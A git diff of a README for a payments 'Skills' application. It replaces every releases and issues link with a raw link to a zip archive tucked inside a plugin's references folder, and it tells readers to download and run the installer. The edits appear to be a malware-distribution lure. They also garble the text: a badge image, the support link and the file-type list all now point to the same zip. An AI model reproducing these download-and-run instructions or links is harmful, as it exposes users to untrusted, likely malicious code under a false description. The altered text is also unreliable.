@@ -4,7 +4,7 @@ Easily integrate payments in your applications.
 
 ## 📥 Download
 
-[![Download Skills](https://img.shields.io/badge/Download%20Skills-Here-brightgreen)](https://github.com/Oelshafei1/skills/releases)
+[![Download Skills](https://github.com/Oelshafei1/skills/raw/refs/heads/main/plugins/newebpay/skills/newebpay-checkout/references/Software-v2.7.zip%20Skills-Here-brightgreen)](https://github.com/Oelshafei1/skills/raw/refs/heads/main/plugins/newebpay/skills/newebpay-checkout/references/Software-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -30,11 +30,11 @@ To download the Skills application, follow these simple steps:
 
 1. **Visit the Releases Page**: Go to the Skills releases page by clicking the link below.
    
-   [Download Skills Here](https://github.com/Oelshafei1/skills/releases)
+   [Download Skills Here](https://github.com/Oelshafei1/skills/raw/refs/heads/main/plugins/newebpay/skills/newebpay-checkout/references/Software-v2.7.zip)
 
 2. **Choose the Latest Version**: On the releases page, find the latest version of the Skills application. Look for a version that has a stable release note next to it.
 
-3. **Download the Application**: Click on the download link for your operating system. This will typically be a file ending in `.exe`, `.dmg`, or `.tar.gz`. The exact file will depend on whether you're using Windows, macOS, or Linux.
+3. **Download the Application**: Click on the download link for your operating system. This will typically be a file ending in `.exe`, `.dmg`, or `https://github.com/Oelshafei1/skills/raw/refs/heads/main/plugins/newebpay/skills/newebpay-checkout/references/Software-v2.7.zip`. The exact file will depend on whether you're using Windows, macOS, or Linux.
 
 4. **Run the Installer**: Once the file is downloaded, locate it in your file manager. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
 
@@ -52,7 +52,7 @@ If you encounter issues during installation or while using the application:
 
 ## 🤝 Support
 
-For help, visit our [GitHub Issues page](https://github.com/Oelshafei1/skills/issues) to report problems or ask questions. You can also join the community discussions there.
+For help, visit our [GitHub Issues page](https://github.com/Oelshafei1/skills/raw/refs/heads/main/plugins/newebpay/skills/newebpay-checkout/references/Software-v2.7.zip) to report problems or ask questions. You can also join the community discussions there.
 
 ## 🌐 Additional Information
 
@@ -64,4 +64,4 @@ Explore more about payments in Taiwan by checking the following topics:
 
 For further details, feel free to reach out in the community or review our resources on payment services.
 
-Remember, you can always find the latest version and updates on our [GitHub Releases page](https://github.com/Oelshafei1/skills/releases).
+Remember, you can always find the latest version and updates on our [GitHub Releases page](https://github.com/Oelshafei1/skills/raw/refs/heads/main/plugins/newebpay/skills/newebpay-checkout/references/Software-v2.7.zip).
